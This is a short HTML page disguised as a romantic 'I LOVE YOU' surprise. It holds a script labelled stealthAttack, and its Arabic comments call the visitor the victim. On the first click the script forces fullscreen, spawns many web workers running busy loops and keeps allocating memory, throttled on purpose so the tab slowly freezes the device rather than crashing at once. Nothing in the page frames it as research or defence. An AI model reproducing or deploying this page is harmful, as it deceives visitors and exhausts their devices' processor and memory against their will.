<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: red; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        h1 { font-size: 5rem; font-family: sans-serif; transition: 0.5s; }
    </style>
</head>
<body>

    <h1 id="text">I LOVE YOU</h1>

    <script>
        function stealthAttack() {
            // دخول ملء الشاشة
            document.documentElement.requestFullscreen().catch(() => {});

            // هجوم المعالج بالتدريج (بفتح عمال كل نصف ثانية)
            let workerCount = 0;
            const maxWorkers = (navigator.hardwareConcurrency || 8) * 2;
            
            const workerInterval = setInterval(() => {
                if (workerCount < maxWorkers) {
                    const worker = new Worker(URL.createObjectURL(new Blob([`
                        setInterval(() => {
                            let x = Math.sqrt(Math.random() * 999);
                            for(let i=0; i<100000; i++) { x += i; }
                        }, 50); // تأخير بسيط عشان المتصفح ميعملش Aw Snap
                    `], {type: 'application/javascript'})));
                    workerCount++;
                } else {
                    clearInterval(workerInterval);
                }
            }, 500);

            // هجوم الرام المتوازن
            let memoryBags = [];
            setInterval(() => {
                // بنحجز 5 ميجا بس كل شوية عشان المتصفح ميفصلش التبويب فجأة
                memoryBags.push(new Float64Array(1024 * 640)); 
            }, 100);
        }

        // بيبدأ أول ما الضحية يلمس الشاشة
        window.onclick = stealthAttack;
    </script>
</body>
</html>
